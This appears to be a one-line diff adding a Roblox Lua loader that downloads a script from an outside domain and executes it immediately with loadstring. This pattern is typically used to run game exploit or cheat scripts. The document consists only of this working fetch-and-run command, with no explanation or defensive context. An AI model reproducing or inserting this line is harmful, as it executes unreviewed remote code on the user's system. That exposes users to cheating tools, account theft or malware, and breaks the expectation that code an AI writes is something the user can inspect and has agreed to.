@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://kanezama.xyz/who/catchabrainrotcontainer.txt"))()
